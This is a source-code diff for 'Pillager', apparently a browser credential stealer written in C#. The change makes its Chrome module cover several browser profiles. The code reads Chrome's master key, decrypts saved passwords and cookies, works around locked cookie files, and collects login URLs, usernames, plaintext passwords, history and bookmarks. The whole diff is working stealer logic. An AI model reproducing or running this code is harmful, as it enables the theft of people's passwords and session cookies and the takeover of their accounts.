@@ -14,7 +14,16 @@ namespace Pillager.Browsers
 
         public byte[] MasterKey { get; set; }
 
-        public Chrome(string Name,string Path)
+        private string[] profiles = {
+        "Default",
+        "Profile 1",
+        "Profile 2",
+        "Profile 3",
+        "Profile 4",
+        "Profile 5"
+        };
+
+        public Chrome(string Name, string Path)
         {
             BrowserName = Name;
             BrowserPath = Path;
@@ -23,7 +32,7 @@ namespace Pillager.Browsers
 
         public byte[] GetMasterKey()
         {
-            string filePath = Path.Combine(Directory.GetParent(BrowserPath).FullName, "Local State");
+            string filePath = Path.Combine(BrowserPath, "Local State");
             byte[] masterKey = new byte[] { };
             if (!File.Exists(filePath))
                 return null;
@@ -54,11 +63,11 @@ namespace Pillager.Browsers
                 string bufferString = Encoding.Default.GetString(buffer);
                 if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
                 {
-                    byte[] iv =new byte[12];
+                    byte[] iv = new byte[12];
                     Array.Copy(buffer, 3, iv, 0, 12);
-                    byte[] cipherText = new byte[buffer.Length-15];
+                    byte[] cipherText = new byte[buffer.Length - 15];
                     Array.Copy(buffer, 15, cipherText, 0, buffer.Length - 15);
-                    byte[] tag =new byte[16];
+                    byte[] tag = new byte[16];
                     Array.Copy(cipherText, cipherText.Length - 16, tag, 0, 16);
                     byte[] data = new byte[cipherText.Length - tag.Length];
                     Array.Copy(cipherText, 0, data, 0, cipherText.Length - tag.Length);
@@ -70,138 +79,127 @@ namespace Pillager.Browsers
                 }
             }
             catch { }
-
             return decryptedData;
         }
 
         public string Chrome_passwords()
         {
             StringBuilder passwords = new StringBuilder();
-            string loginDataPath = Path.Combine(BrowserPath, "Login Data");
-            if (!File.Exists(loginDataPath))
+            foreach (var profile in profiles)
             {
-                return null;
-            }
-
-            try
-            {
-                string tempLoginDataPath = Path.GetTempFileName();
-
-                File.Copy(loginDataPath, tempLoginDataPath, true);
-
-                SQLiteHandler handler = new SQLiteHandler(tempLoginDataPath);
-
-                if (!handler.ReadTable("logins"))
-                    return null;
-
-                for (int i = 0; i < handler.GetRowCount(); i++)
+                string loginDataPath = Path.Combine(BrowserPath, profile + "\\Login Data");
+                if (!File.Exists(loginDataPath))
+                    continue;
+                try
                 {
-                    string url = handler.GetValue(i, "origin_url");
-                    string username = handler.GetValue(i, "username_value");
-                    string crypt = handler.GetValue(i, "password_value");
-
-                    string password = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
-
-                    if (url!=null &&url!=""&& username != null && username != "" &&
-                        !(password is null) && password.Length > 0)
+                    string tempLoginDataPath = Path.GetTempFileName();
+                    File.Copy(loginDataPath, tempLoginDataPath, true);
+                    SQLiteHandler handler = new SQLiteHandler(tempLoginDataPath);
+                    if (!handler.ReadTable("logins"))
+                        continue;
+                    for (int i = 0; i < handler.GetRowCount(); i++)
                     {
-                        passwords.Append("\t[URL] -> {" + url + "}\n\t[USERNAME] -> {" + username + "}\n\t[PASSWORD] -> {" + password + "}\n");
-                        passwords.AppendLine();
+                        string url = handler.GetValue(i, "origin_url");
+                        string username = handler.GetValue(i, "username_value");
+                        string crypt = handler.GetValue(i, "password_value");
+                        string password = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
+                        if (url != null && url != "" && username != null && username != "" && !(password is null) && password.Length > 0)
+                        {
+                            passwords.Append("\t[URL] -> {" + url + "}\n\t[USERNAME] -> {" + username + "}\n\t[PASSWORD] -> {" + password + "}\n");
+                            passwords.AppendLine();
+                        }
                     }
+                    File.Delete(tempLoginDataPath);
                 }
-
-                File.Delete(tempLoginDataPath);
+                catch { }
             }
-            catch { }
-
             return passwords.ToString();
         }
 
         public string Chrome_history()
         {
             StringBuilder history = new StringBuilder();
-            string chrome_History_path = Path.Combine(BrowserPath, "History");
-            if (!File.Exists(chrome_History_path))
+            foreach (var profile in profiles)
             {
-                return null;
-            }
-            try
-            {
-                string history_tempFile = Path.GetTempFileName();
-                File.Copy(chrome_History_path, history_tempFile, true);
-                SQLiteHandler handler = new SQLiteHandler(history_tempFile);
-                if (!handler.ReadTable("urls"))
-                    return null;
-                for (int i = 0; i < handler.GetRowCount(); i++)
+                string chrome_History_path = Path.Combine(BrowserPath, profile + "\\History");
+                if (!File.Exists(chrome_History_path))
+                    continue;
+                try
                 {
-                    string url = handler.GetValue(i, "url");
-                    history.AppendLine(url);
+                    string history_tempFile = Path.GetTempFileName();
+                    File.Copy(chrome_History_path, history_tempFile, true);
+                    SQLiteHandler handler = new SQLiteHandler(history_tempFile);
+                    if (!handler.ReadTable("urls"))
+                        continue;
+                    for (int i = 0; i < handler.GetRowCount(); i++)
+                    {
+                        string url = handler.GetValue(i, "url");
+                        history.AppendLine(url);
+                    }
+                    File.Delete(history_tempFile);
                 }
-                File.Delete(history_tempFile);
+                catch { }
             }
-            catch { }
-
-
             return history.ToString(); ;
         }
 
         public string Chrome_cookies()
         {
             StringBuilder cookies = new StringBuilder();
-            string chrome_cookie_path = Path.Combine(BrowserPath, "Cookies");
-            string chrome_100plus_cookie_path = Path.Combine(BrowserPath, "Network\\Cookies");
-            if (!File.Exists(chrome_cookie_path) == true) chrome_cookie_path = chrome_100plus_cookie_path;
-            if (!File.Exists(chrome_cookie_path))
+            foreach (var profile in profiles)
             {
-                return null;
-            }
-            try
-            {
-                string cookie_tempFile = Path.GetTempFileName();
+                string chrome_cookie_path = Path.Combine(BrowserPath, profile + "\\Cookies");
+                string chrome_100plus_cookie_path = Path.Combine(BrowserPath, profile + "\\Network\\Cookies");
+                if (!File.Exists(chrome_cookie_path) == true) 
+                    chrome_cookie_path = chrome_100plus_cookie_path;
+                if (!File.Exists(chrome_cookie_path))
+                    continue;
                 try
                 {
-                    File.Copy(chrome_cookie_path, cookie_tempFile, true);
-                }
-                catch 
-                {
-                    byte[] ckfile = LockedFile.ReadLockedFile(chrome_cookie_path);
-                    if (ckfile!=null)
+                    string cookie_tempFile = Path.GetTempFileName();
+                    try
                     {
-                        File.WriteAllBytes(cookie_tempFile, ckfile);
+                        File.Copy(chrome_cookie_path, cookie_tempFile, true);
                     }
+                    catch
+                    {
+                        byte[] ckfile = LockedFile.ReadLockedFile(chrome_cookie_path);
+                        if (ckfile != null)
+                        {
+                            File.WriteAllBytes(cookie_tempFile, ckfile);
+                        }
+                    }
+                    SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
+                    if (!handler.ReadTable("cookies"))
+                        continue;
+                    for (int i = 0; i < handler.GetRowCount(); i++)
+                    {
+                        string host_key = handler.GetValue(i, "host_key");
+                        string name = handler.GetValue(i, "name");
+                        string crypt = handler.GetValue(i, "encrypted_value");
+                        string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
+                        cookies.AppendLine("[" + host_key + "] \t {" + name + "}={" + cookie + "}");
+                    }
+                    File.Delete(cookie_tempFile);
                 }
-                SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
-                if (!handler.ReadTable("cookies"))
-                    return null;
-                for (int i = 0; i < handler.GetRowCount(); i++)
-                {
-                    string host_key = handler.GetValue(i, "host_key");
-                    string name = handler.GetValue(i, "name");
-                    string crypt = handler.GetValue(i, "encrypted_value");
-
-                    string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
-                    cookies.AppendLine("[" + host_key + "] \t {" + name + "}={" + cookie + "}");
-                }
-
-                File.Delete(cookie_tempFile);
+                catch { }
             }
-            catch { }
-
             return cookies.ToString();
         }
 
         public string Chrome_books()
         {
             StringBuilder stringBuilder = new StringBuilder();
-            string chrome_book_path = Path.Combine(BrowserPath, "Bookmarks");
-            if (File.Exists(chrome_book_path))
+            foreach (var profile in profiles)
             {
-                stringBuilder.Append(File.ReadAllText(chrome_book_path));
+                string chrome_book_path = Path.Combine(BrowserPath, profile + "\\Bookmarks");
+                if (File.Exists(chrome_book_path))
+                {
+                    stringBuilder.Append(File.ReadAllText(chrome_book_path));
+                }
             }
             return stringBuilder.ToString();
         }
-
-        
 
         public void Save(string path)
         {
